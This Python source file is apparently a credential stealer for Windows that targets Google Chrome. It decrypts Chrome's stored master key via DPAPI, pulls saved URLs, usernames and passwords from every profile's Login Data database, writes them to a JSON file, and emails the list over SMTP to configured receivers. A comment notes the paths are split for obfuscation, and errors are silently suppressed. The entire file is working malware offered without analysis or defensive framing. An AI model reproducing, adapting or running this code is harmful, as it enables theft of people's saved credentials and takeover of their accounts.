from pathlib import Path
import yaml
from typing import Dict, Union
import os,sys
import smtplib
from email.mime.text import MIMEText
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil


base_path = os.path.dirname(os.path.realpath(sys.argv[0]))
# 方便混淆
google_info_path_1 = os.environ['USERPROFILE']
google_info_path_2 = '\\AppData\\Local\\Google\\Chrome\\User Data'


def read_yaml(yaml_path: Union[str, Path]) -> Dict:
    base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    config_path = os.path.join(base_dir, yaml_path)
    with open(config_path, 'rb') as f:
        data = yaml.load(f, Loader=yaml.Loader)
    if 'include' in data:
        include = data.pop('include')
        if isinstance(include, str):
            include = [include]
        for i in include:
            data.update(read_yaml(Path(config_path).parent / i))
    return data


config = read_yaml('config.yaml')

def email_send(title,msg):
    message = MIMEText(msg,'plain','utf-8')
    message['Subject'] = title 
    message['From'] = config["email"]["sender"]   
    message['To'] = config["email"]["receivers"] 
    try:
        smtpObj = smtplib.SMTP() 
        smtpObj.connect(config["email"]["host"],25)
        smtpObj.login(config["email"]["user"],config["email"]["pass"]) 
        smtpObj.sendmail(config["email"]["sender"],[config["email"]["receivers"]],message.as_string()) 
        smtpObj.quit() 
    except Exception as e:
        print(e)
  
def get_fencrypted_key():
    try:
        google_info_path = google_info_path_1 + google_info_path_2
        first_data_path = os.path.normpath(os.path.join(google_info_path, 'Local State'))
        temp_path = os.path.join(base_path,'./temp')
        shutil.copy(first_data_path, temp_path)
        with open(temp_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        os.remove(temp_path)
        return secret_key
    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return None
    

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""

if __name__ == '__main__':
    try:
        fencrypted_key = get_fencrypted_key()
        db_path = os.path.normpath(google_info_path_1 + google_info_path_2)
        folders = [element for element in os.listdir(db_path) if re.search("^Profile*|^Default$",element)!=None]
        ret_list = []
        for folder in folders:
            db_path_folder = os.path.normpath(os.path.join(db_path, folder,'Login Data'))
            try:
                temp_db_path = os.path.join(base_path,'./temp.db')
                shutil.copy2(db_path_folder, temp_db_path) 
                conn = sqlite3.connect(temp_db_path)
            except Exception as e:
                print("db open fail:".format(e))
                exit(0)
            if(fencrypted_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    ret = {}
                    ret["url"] = login[0]
                    ret["username"] = login[1]
                    temp_p = login[2]
                    if(ret["url"] !="" and ret["username"]!="" and temp_p!=""):
                        p = decrypt_password(temp_p, fencrypted_key)
                        ret["p"] = p
                        ret_list.append(ret)
                cursor.close()
                conn.close()
                os.remove(temp_db_path)  

        if(config["output"]["json"] == "ON"):
            with open(os.path.join(base_path,"output.json"),"w",encoding="utf-8") as f:
                    json.dump(ret_list,f,ensure_ascii=False,indent=4)
        if(config["output"]["email"] == "ON"):
           email_send('chrome',str(ret_list))
        
    except:
        pass
    